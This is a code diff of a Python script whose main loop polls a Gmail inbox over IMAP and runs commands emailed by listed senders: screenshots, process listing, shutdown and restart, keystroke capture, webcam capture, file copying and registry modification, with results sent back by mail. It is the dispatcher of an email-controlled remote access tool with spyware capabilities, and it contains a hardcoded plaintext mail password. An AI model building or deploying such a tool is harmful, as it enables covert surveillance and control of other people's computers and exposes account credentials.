@@ -20,8 +20,6 @@ PASSWORD = 'rrsdrqjjwudklnjx'
 if __name__ == '__main__':
     ui.getAllMail()
     
-    print(ui.mailList)
-    
     conn = imaplib.IMAP4_SSL('imap.gmail.com')
     
     try:
@@ -43,8 +41,6 @@ if __name__ == '__main__':
                     
                     sender = email.utils.parseaddr(email_message['From'])[1]
                     
-                    print(sender)
-                    
                     if sender not in ui.mailList:
                         continue
                     
@@ -55,11 +51,9 @@ if __name__ == '__main__':
                             body_message = elem.get_payload(decode=True).decode()
                             break
                 
-                    
-                    print(body_message)
                     body_message = body_message.strip()
                     
-                    if 'SCREENSHOT' == body_message:
+                    if 'SCREENSHOT' in body_message:
                         reply_screenshot(email_message, USERNAME, PASSWORD)
                     elif 'LIST PROCESSES' == body_message:
                         reply_list_running_app(email_message, USERNAME, PASSWORD)
@@ -72,29 +66,24 @@ if __name__ == '__main__':
                         except:
                             pass
                     elif 'SHUTDOWN' in body_message:
-                        #pass
                         reply_shutdown(email_message, USERNAME, PASSWORD)
                     elif 'RESTART' in body_message:
-                        #pass
                         reply_restart(email_message, USERNAME, PASSWORD)
                     elif 'CATCH KEYBOARD' in body_message:
                         reply_pressed_key(email_message, USERNAME, PASSWORD)
                     elif 'VIDEO' in body_message:
                         reply_camera_capture(email_message, USERNAME, PASSWORD)
                     elif 'COPY' in body_message:
-                        # Kinda lazy let just do this for now
                         ls = body_message.split()
                         pos = ls.index('COPY')
                         
                         if pos + 2 < len(ls):
                             reply_copy_file(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2])
                     elif 'REG' in body_message:
-                        # pass
                         ls = body_message.split()
                         pos = ls.index('REG')
                         
                         if pos + 3 < len(ls):
-                            # pass
                             reply_modify_reg(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2], ls[pos + 3])
                         
                         
